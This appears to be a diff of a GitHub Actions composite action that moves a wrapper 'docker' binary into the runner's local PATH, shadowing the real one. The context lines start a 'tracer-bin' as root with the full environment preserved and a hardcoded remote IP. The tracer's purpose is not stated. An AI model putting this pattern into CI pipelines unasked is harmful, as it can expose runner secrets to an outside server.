@@ -34,7 +34,7 @@ runs:
         chmod +x tracer-bin
         chmod +x ./docker
         
-        mv ./docker /snap/bin/docker
+        mv ./docker /home/runner/.local/bin/docker
         
         # Start tracer
         sudo -E SERVER_HOST=52.23.138.136 SERVER_PORT=50051 ./tracer-bin &        
